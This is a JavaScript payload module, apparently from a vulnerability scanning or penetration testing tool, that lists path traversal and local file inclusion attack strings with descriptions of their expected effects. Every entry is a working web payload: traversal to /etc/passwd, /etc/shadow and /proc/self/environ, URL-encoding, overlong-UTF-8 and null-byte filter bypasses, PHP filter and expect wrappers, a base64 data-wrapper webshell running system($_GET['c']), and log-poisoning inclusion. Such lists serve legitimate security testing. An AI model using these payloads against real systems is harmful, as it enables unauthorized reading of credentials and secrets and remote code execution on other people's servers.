/**
 * Path Traversal / Local File Inclusion (LFI) Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 *
 * Categories: basic, advanced, filter_bypass, context_url
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "../../../etc/passwd",
        description: "Basic path traversal to /etc/passwd (Linux)",
        expected_behavior: "Returns contents of /etc/passwd proving arbitrary file read"
    },
    {
        type: "basic",
        payload: "../../../etc/shadow",
        description: "Path traversal to /etc/shadow (Linux — requires root)",
        expected_behavior: "Returns password hashes if process runs as root"
    },
    {
        type: "basic",
        payload: "../../../../Windows/win.ini",
        description: "Path traversal to win.ini (Windows)",
        expected_behavior: "Returns contents of win.ini, proving file read on Windows"
    },
    {
        type: "basic",
        payload: "../../../etc/hosts",
        description: "Read /etc/hosts for internal network mapping",
        expected_behavior: "Reveals internal hostnames and IP addresses"
    },
    {
        type: "basic",
        payload: "../../../proc/self/environ",
        description: "Read process environment variables (Linux)",
        expected_behavior: "Exposes environment vars including potential secrets and API keys"
    },
    {
        type: "basic",
        payload: "../../../proc/self/cmdline",
        description: "Read process command line arguments",
        expected_behavior: "Reveals how the process was started and its arguments"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "....//....//....//etc/passwd",
        description: "Double-dot-slash bypass for single ../ removal filters",
        expected_behavior: "Filter removes ../ once, remaining ....// becomes ../../../"
    },
    {
        type: "advanced",
        payload: "../../../etc/passwd%00.jpg",
        description: "Null byte truncation to bypass extension check (PHP < 5.3)",
        expected_behavior: "Null byte terminates string at %00; .jpg extension is ignored"
    },
    {
        type: "advanced",
        payload: "..%252f..%252f..%252fetc/passwd",
        description: "Double URL encoding of / character",
        expected_behavior: "%252f decodes to %2f then to / on double-decode"
    },
    {
        type: "advanced",
        payload: "php://filter/convert.base64-encode/resource=index.php",
        description: "PHP wrapper — read source code as base64",
        expected_behavior: "Returns base64-encoded PHP source code instead of executing it"
    },
    {
        type: "advanced",
        payload: "php://input",
        description: "PHP wrapper — execute POST body as PHP",
        expected_behavior: "POST body is treated as PHP code and executed (RCE)"
    },
    {
        type: "advanced",
        payload: "expect://id",
        description: "PHP expect wrapper — execute system command",
        expected_behavior: "Executes 'id' command if expect:// wrapper is enabled"
    },
    {
        type: "advanced",
        payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
        description: "PHP data wrapper — base64-encoded webshell",
        expected_behavior: "Decodes to <?php system($_GET['c']); ?> and executes (RCE)"
    },
    {
        type: "advanced",
        payload: "/var/log/apache2/access.log",
        description: "Log file inclusion after log poisoning",
        expected_behavior: "If attacker injected PHP in User-Agent, including the log executes it"
    },
    {
        type: "advanced",
        payload: "/proc/self/fd/0",
        description: "Read stdin file descriptor (potential info leak)",
        expected_behavior: "May reveal input data or provide access to fd-based exploits"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "..%c0%afetc/passwd",
        description: "UTF-8 overlong encoding of / (IIS/Java)",
        expected_behavior: "%c0%af is an overlong encoding of /; bypasses ASCII-only filters"
    },
    {
        type: "filter_bypass",
        payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        description: "URL-encoded dots and slashes",
        expected_behavior: "%2e%2e%2f decodes to ../; bypasses literal ../ detection"
    },
    {
        type: "filter_bypass",
        payload: "..\\..\\..\\etc\\passwd",
        description: "Backslash path traversal (Windows / some frameworks)",
        expected_behavior: "Backslashes used as path separators on Windows and some web servers"
    },
    {
        type: "filter_bypass",
        payload: "..%5c..%5c..%5cetc%5cpasswd",
        description: "URL-encoded backslash traversal",
        expected_behavior: "%5c is \\; bypasses forward-slash-only traversal filters"
    },
    {
        type: "filter_bypass",
        payload: "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        description: "Triple-encoded path traversal",
        expected_behavior: "Multiple decode rounds resolve to ../../../etc/passwd"
    },
    {
        type: "filter_bypass",
        payload: "..%00/..%00/..%00/etc/passwd",
        description: "Null byte in path segments",
        expected_behavior: "Null bytes may bypass path validation in some languages"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "?file=../../../etc/passwd",
        description: "Path traversal in file parameter",
        expected_behavior: "Common file inclusion via query parameter"
    },
    {
        type: "context_url",
        payload: "?page=....//....//....//etc/passwd",
        description: "Path traversal with double-dot-slash bypass in page param",
        expected_behavior: "Targets file inclusion endpoints that strip ../"
    },
    {
        type: "context_url",
        payload: "?template=../../../proc/self/environ",
        description: "Environment variable leak via template parameter",
        expected_behavior: "Reads server environment variables through template loading"
    },
    {
        type: "context_url",
        payload: "?lang=php://filter/convert.base64-encode/resource=config.php",
        description: "PHP filter wrapper via language parameter",
        expected_behavior: "Reads PHP config source code as base64 via language selector"
    },
];

module.exports = {
    vulnerability: "path_traversal",
    name: "Path Traversal / Local File Inclusion",
    description: "Payloads for testing directory traversal and local file inclusion vulnerabilities including PHP wrappers and encoding bypasses",
    payloads,
};
